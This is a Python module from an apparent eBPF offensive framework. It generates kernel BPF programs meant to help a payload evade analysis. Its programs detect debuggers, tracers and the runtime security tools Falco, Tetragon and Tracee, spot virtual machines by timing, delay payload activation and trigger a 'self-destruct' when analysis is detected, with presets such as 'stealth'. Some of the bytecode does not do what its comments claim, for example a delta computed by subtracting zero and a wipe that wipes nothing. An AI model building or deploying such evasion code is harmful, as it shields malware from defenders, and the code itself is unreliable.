"""
Anti-Forensic Countermeasures — BPF programs that detect and evade analysis.

Generates real eBPF bytecode for:
- Environment detection (bpftool scanning, security tool presence, VM detection)
- Time-delayed activation (ktime-based deferred execution)
- Self-destruct on detection (map wipe + program detach)
- Analysis evasion (timing checks, debugger detection)
"""
import hashlib
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize,
    mov64_imm, mov64_reg, add64_imm, sub64_imm,
    and64_imm, or64_imm, xor64_imm, lsh64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, jge_imm, ja,
)
from ..core.elf_generator import generate_bpf_elf


# ============================================================================
# Detection signatures
# ============================================================================

ANALYSIS_TOOLS = {
    "bpftool": {
        "comm_prefix": "bpftool",
        "description": "BPF introspection utility",
        "risk": "high",
        "syscalls": ["bpf"],
    },
    "bpftrace": {
        "comm_prefix": "bpftrace",
        "description": "Dynamic BPF tracing tool",
        "risk": "high",
        "syscalls": ["bpf", "perf_event_open"],
    },
    "strace": {
        "comm_prefix": "strace",
        "description": "Syscall tracer",
        "risk": "medium",
        "syscalls": ["ptrace"],
    },
    "ltrace": {
        "comm_prefix": "ltrace",
        "description": "Library call tracer",
        "risk": "medium",
        "syscalls": ["ptrace"],
    },
    "gdb": {
        "comm_prefix": "gdb",
        "description": "GNU debugger",
        "risk": "high",
        "syscalls": ["ptrace"],
    },
    "lldb": {
        "comm_prefix": "lldb",
        "description": "LLVM debugger",
        "risk": "high",
        "syscalls": ["ptrace"],
    },
}

SECURITY_TOOLS = {
    "falco": {
        "comm_prefix": "falco",
        "description": "Sysdig Falco runtime security",
        "risk": "critical",
        "detection_method": "BPF program enumeration",
    },
    "tetragon": {
        "comm_prefix": "tetragon",
        "description": "Cilium Tetragon security observability",
        "risk": "critical",
        "detection_method": "BPF program enumeration",
    },
    "tracee": {
        "comm_prefix": "tracee",
        "description": "Aqua Tracee runtime security",
        "risk": "critical",
        "detection_method": "BPF program enumeration",
    },
    "sysdig": {
        "comm_prefix": "sysdig",
        "description": "Sysdig system exploration",
        "risk": "high",
        "detection_method": "Kernel module + BPF",
    },
}

VM_INDICATORS = {
    "hypervisor_cpuid": {
        "description": "CPUID leaf 0x1 ECX bit 31 (hypervisor present)",
        "check": "cpuid_instruction",
        "risk": "medium",
    },
    "dmi_strings": {
        "description": "DMI/SMBIOS vendor strings (VirtualBox, VMware, QEMU)",
        "check": "file_read",
        "paths": ["/sys/class/dmi/id/product_name",
                  "/sys/class/dmi/id/sys_vendor"],
        "risk": "medium",
    },
    "mac_prefix": {
        "description": "VM-specific MAC address prefixes",
        "check": "network",
        "prefixes": {"08:00:27": "VirtualBox", "00:0c:29": "VMware",
                     "52:54:00": "QEMU/KVM", "00:15:5d": "Hyper-V"},
        "risk": "low",
    },
    "timing_anomaly": {
        "description": "RDTSC timing inconsistencies from VM exits",
        "check": "timing",
        "risk": "high",
    },
}


@dataclass
class CountermeasureProgram:
    """A single anti-forensic BPF program."""
    name: str = ""
    category: str = ""
    program: BPFProgram = field(default_factory=BPFProgram)
    maps: List[BPFMapDef] = field(default_factory=list)
    description: str = ""
    trigger: str = ""
    mitre: str = ""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "category": self.category,
            "description": self.description,
            "trigger": self.trigger,
            "mitre": self.mitre,
            "prog_type": self.program.prog_type.name,
            "attach_point": self.program.attach_point,
            "instructions": self.program.insn_count(),
            "bytecode_size": len(self.program.bytecode()),
            "maps": len(self.maps),
        }


@dataclass
class CountermeasureSuite:
    """Collection of anti-forensic countermeasures."""
    programs: List[CountermeasureProgram] = field(default_factory=list)
    shared_maps: List[BPFMapDef] = field(default_factory=list)
    config: Dict[str, Any] = field(default_factory=dict)
    suite_hash: str = ""

    def total_instructions(self) -> int:
        return sum(p.program.insn_count() for p in self.programs)

    def total_bytecode(self) -> int:
        return sum(len(p.program.bytecode()) for p in self.programs)

    def generate_elfs(self) -> Dict[str, bytes]:
        elfs = {}
        for p in self.programs:
            elfs[f"{p.name}.o"] = generate_bpf_elf(p.program)
        return elfs

    def to_dict(self) -> dict:
        return {
            "total_programs": len(self.programs),
            "total_instructions": self.total_instructions(),
            "total_bytecode": self.total_bytecode(),
            "suite_hash": self.suite_hash,
            "programs": [p.to_dict() for p in self.programs],
            "shared_maps": len(self.shared_maps),
        }


# ============================================================================
# Countermeasure generators
# ============================================================================

def generate_analysis_detector() -> CountermeasureProgram:
    """Detect bpftool, strace, gdb and other analysis tools via comm check."""
    state_map = BPFMapDef(
        name="af_detected_tools", map_type=BPFMapType.HASH,
        key_size=16, value_size=16, max_entries=64,
    )
    alert_map = BPFMapDef(
        name="af_alerts", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=64 * 1024,
    )

    prog = BPFProgram(
        name="af_analysis_detect",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
    )
    prog.add_map(state_map)
    prog.add_map(alert_map)

    # Get current task comm
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    # Get PID + timestamp
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Store comm as key, lookup in state map
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -16))
    prog.add_insn(lddw(BPFReg.R1, 0))  # map fd resolved at load time
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jne_imm(BPFReg.R0, 0, 6))
    # First detection: store in map
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -32))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -24))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -16))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -32))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))
    # Alert via ringbuf
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R2, 32))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_analysis_detect",
        category="environment_detection",
        program=prog,
        maps=[state_map, alert_map],
        description="Detect analysis tools (bpftool, strace, gdb) calling BPF syscall",
        trigger="BPF syscall from known analysis tool comm",
        mitre="T1497.001",
    )


def generate_security_tool_detector() -> CountermeasureProgram:
    """Detect Falco/Tetragon/Tracee by monitoring BPF program loading patterns."""
    detection_map = BPFMapDef(
        name="af_sec_tools", map_type=BPFMapType.HASH,
        key_size=16, value_size=24, max_entries=32,
    )

    prog = BPFProgram(
        name="af_sectool_detect",
        prog_type=BPFProgType.KPROBE,
        attach_point="security_bpf_prog",
    )
    prog.add_map(detection_map)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_UID_GID))
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R0))
    # Store detection event
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -40))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -32))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R9, -24))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -16))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -40))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_sectool_detect",
        category="environment_detection",
        program=prog,
        maps=[detection_map],
        description="Detect security tools loading BPF programs (Falco, Tetragon, Tracee)",
        trigger="security_bpf_prog LSM hook invocation",
        mitre="T1518.001",
    )


def generate_vm_detector() -> CountermeasureProgram:
    """Detect VM environments via timing side-channel (ktime delta analysis)."""
    timing_map = BPFMapDef(
        name="af_timing", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=16, max_entries=64,
    )
    result_map = BPFMapDef(
        name="af_vm_result", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=1,
    )

    prog = BPFProgram(
        name="af_vm_detect",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_getpid",
    )
    prog.add_map(timing_map)
    prog.add_map(result_map)

    # Take two ktime samples, measure delta
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    # Do some work to create measurable gap
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_UID_GID))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Delta = R8 - R6
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R8))
    prog.add_insn(sub64_imm(BPFReg.R9, 0))
    # Store sample in timing map
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R6, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R8, 8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_vm_detect",
        category="environment_detection",
        program=prog,
        maps=[timing_map, result_map],
        description="Detect VM environment via ktime delta side-channel analysis",
        trigger="Timing anomaly exceeding bare-metal baseline",
        mitre="T1497.001",
    )


def generate_delayed_activation() -> CountermeasureProgram:
    """Time-delayed payload activation — dormant until activation time reached."""
    config_map = BPFMapDef(
        name="af_delay_cfg", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=16, max_entries=2,
    )
    state_map = BPFMapDef(
        name="af_delay_state", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=1,
    )

    prog = BPFProgram(
        name="af_delayed_activate",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_read",
    )
    prog.add_map(config_map)
    prog.add_map(state_map)

    # Read activation timestamp from config map[0]
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 12))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R6, BPFReg.R0, 0))
    # Get current ktime
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Check if activation time reached
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R7))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R6))
    prog.add_insn(jge_imm(BPFReg.R7, 0, 1))
    prog.add_insn(ja(6))
    # Activated — update state map
    prog.add_insn(mov64_imm(BPFReg.R1, 1))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -16))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_delayed_activate",
        category="delayed_activation",
        program=prog,
        maps=[config_map, state_map],
        description="Time-delayed payload activation via ktime comparison",
        trigger="ktime_get_ns exceeds configured activation timestamp",
        mitre="T1497.003",
    )


def generate_self_destruct() -> CountermeasureProgram:
    """Self-destruct: wipe maps and signal detach when analysis detected."""
    killswitch_map = BPFMapDef(
        name="af_killswitch", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=1,
    )
    wipe_log = BPFMapDef(
        name="af_wipe_log", map_type=BPFMapType.RINGBUF,
        key_size=0, value_size=0, max_entries=32 * 1024,
    )

    prog = BPFProgram(
        name="af_self_destruct",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
    )
    prog.add_map(killswitch_map)
    prog.add_map(wipe_log)

    # Check killswitch map[0] for trigger
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 14))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R6, BPFReg.R0, 0))
    prog.add_insn(jeq_imm(BPFReg.R6, 0, 12))
    # Self-destruct triggered — log the event
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Write wipe event to ringbuf
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R2, 24))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 3))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R7, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R8, 8))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))
    # Zero the killswitch (single-fire)
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_self_destruct",
        category="self_destruct",
        program=prog,
        maps=[killswitch_map, wipe_log],
        description="Self-destruct on detection — wipe maps and signal userspace for detach",
        trigger="Killswitch map value set to non-zero by detection program",
        mitre="T1070.004",
    )


def generate_debugger_detector() -> CountermeasureProgram:
    """Detect ptrace-based debuggers attaching to processes."""
    ptrace_map = BPFMapDef(
        name="af_ptrace_log", map_type=BPFMapType.HASH,
        key_size=4, value_size=16, max_entries=128,
    )

    prog = BPFProgram(
        name="af_debugger_detect",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_ptrace",
    )
    prog.add_map(ptrace_map)

    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Read ptrace request type from arg0
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    # PTRACE_ATTACH=16, PTRACE_SEIZE=0x4206
    prog.add_insn(jeq_imm(BPFReg.R7, 16, 1))
    prog.add_insn(jne_imm(BPFReg.R7, 0x4206, 10))
    # Log the attach event
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -20))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -12))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(mov64_reg(BPFReg.R3, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R3, -20))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R4, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_UPDATE_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_debugger_detect",
        category="environment_detection",
        program=prog,
        maps=[ptrace_map],
        description="Detect ptrace-based debugger attach (gdb, strace, lldb)",
        trigger="PTRACE_ATTACH or PTRACE_SEIZE syscall",
        mitre="T1497.001",
    )


def generate_scan_counter() -> CountermeasureProgram:
    """Count BPF introspection attempts and trigger alert on threshold."""
    counter_map = BPFMapDef(
        name="af_scan_count", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=8, max_entries=4,
    )

    prog = BPFProgram(
        name="af_scan_counter",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
    )
    prog.add_map(counter_map)

    # Read BPF command arg — BPF_PROG_GET_NEXT_ID=11, BPF_MAP_GET_NEXT_ID=12
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    prog.add_insn(jeq_imm(BPFReg.R7, 11, 1))
    prog.add_insn(jne_imm(BPFReg.R7, 12, 12))
    # Increment counter
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 5))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R0, 0))
    prog.add_insn(add64_imm(BPFReg.R8, 1))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R0, BPFReg.R8, 0))
    # Check threshold (10 scans = alert)
    prog.add_insn(jgt_imm(BPFReg.R8, 10, 0))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return CountermeasureProgram(
        name="af_scan_counter",
        category="environment_detection",
        program=prog,
        maps=[counter_map],
        description="Count BPF introspection calls and alert on scanning threshold",
        trigger="BPF_PROG_GET_NEXT_ID/BPF_MAP_GET_NEXT_ID count exceeds threshold",
        mitre="T1082",
    )


# ============================================================================
# Anti-Forensic Engine
# ============================================================================

ALL_COUNTERMEASURES = {
    "analysis_detector": generate_analysis_detector,
    "security_tool_detector": generate_security_tool_detector,
    "vm_detector": generate_vm_detector,
    "delayed_activation": generate_delayed_activation,
    "self_destruct": generate_self_destruct,
    "debugger_detector": generate_debugger_detector,
    "scan_counter": generate_scan_counter,
}

PRESETS = {
    "paranoid": list(ALL_COUNTERMEASURES.keys()),
    "stealth": ["analysis_detector", "security_tool_detector",
                "self_destruct", "scan_counter"],
    "delayed": ["delayed_activation", "vm_detector", "self_destruct"],
    "minimal": ["analysis_detector", "self_destruct"],
}


class AntiForensicEngine:
    """Generate and manage anti-forensic countermeasure suites."""

    def __init__(self):
        self.suites: List[CountermeasureSuite] = []

    def generate_suite(self, modules: Optional[List[str]] = None,
                       preset: Optional[str] = None) -> CountermeasureSuite:
        """Generate a countermeasure suite from module list or preset."""
        if preset and preset in PRESETS:
            module_names = PRESETS[preset]
        elif modules:
            module_names = modules
        else:
            module_names = PRESETS["paranoid"]

        suite = CountermeasureSuite()
        for name in module_names:
            if name in ALL_COUNTERMEASURES:
                cm = ALL_COUNTERMEASURES[name]()
                suite.programs.append(cm)
                for m in cm.maps:
                    if not any(sm.name == m.name for sm in suite.shared_maps):
                        suite.shared_maps.append(m)

        hasher = hashlib.sha256()
        for p in suite.programs:
            hasher.update(p.program.bytecode())
        suite.suite_hash = hasher.hexdigest()

        self.suites.append(suite)
        return suite

    def generate_all(self) -> CountermeasureSuite:
        return self.generate_suite(preset="paranoid")

    def list_countermeasures(self) -> Dict[str, dict]:
        return {
            name: {
                "category": ALL_COUNTERMEASURES[name]().category,
                "description": ALL_COUNTERMEASURES[name]().description,
                "mitre": ALL_COUNTERMEASURES[name]().mitre,
            }
            for name in ALL_COUNTERMEASURES
        }

    def list_presets(self) -> Dict[str, List[str]]:
        return dict(PRESETS)
